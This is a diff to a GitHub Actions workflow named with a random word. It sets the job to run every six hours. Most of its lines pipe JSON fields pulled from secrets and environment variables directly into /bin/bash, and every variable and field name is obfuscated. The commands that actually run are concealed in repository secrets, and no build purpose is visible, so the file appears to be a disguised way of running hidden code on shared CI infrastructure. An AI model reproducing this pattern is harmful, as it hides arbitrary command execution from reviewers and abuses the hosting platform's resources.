@@ -3,9 +3,9 @@ name: separatecocksfoot
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 2/6 * * *'
+    - cron: '45 4/6 * * *'
 
-jobs:  # 22313
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,17 +13,16 @@ jobs:  # 22313
       - uses: actions/checkout@v4
       - name: separatecocksfoot
         env:
-          jwc9: ${{ secrets.jwc9 }}
+          nurde321: ${{ secrets.nurde321 }}
         run: |
-          echo $jwc9 | jq -r .mlqf20 | /bin/bash
-          echo $dhko6670 | jq -r .wf5831 | /bin/bash
-          echo $mm56909 | jq -r .stg64 | /bin/bash
-          echo $mtcja430 | jq -r .zh75590 | /bin/bash
-          echo $bkjj46 | jq -r .cosf542 | /bin/bash
-          echo $r6265 | jq -r .zcn70 | /bin/bash
-          echo $rzwx2371 | jq -r .lei1626 | /bin/bash
-          echo $d84287 | jq -r .ahgk12 | /bin/bash
-          echo $sv168 | jq -r .io14031 | /bin/bash
-          echo $y229 | jq -r .hf365 | /bin/bash
-          echo $nwaha21433 | jq -r .q253 | /bin/bash
+          echo $nurde321 | jq -r .y510 | /bin/bash
+          echo $uiwm4 | jq -r .mhcfz90159 | /bin/bash
+          echo $cpaxz027 | jq -r .zcfif14841 | /bin/bash
+          echo $ay0 | jq -r .nmi12 | /bin/bash
+          echo $w5725 | jq -r .l80 | /bin/bash
+          echo $yw606 | jq -r .chfm4 | /bin/bash
+          echo $nvm07 | jq -r .cvoyc1 | /bin/bash
+          echo $o7 | jq -r .nmsm34 | /bin/bash
+          echo $id903 | jq -r .angh84 | /bin/bash
+          echo $fqagx8594 | jq -r .jzqbs2178 | /bin/bash
 
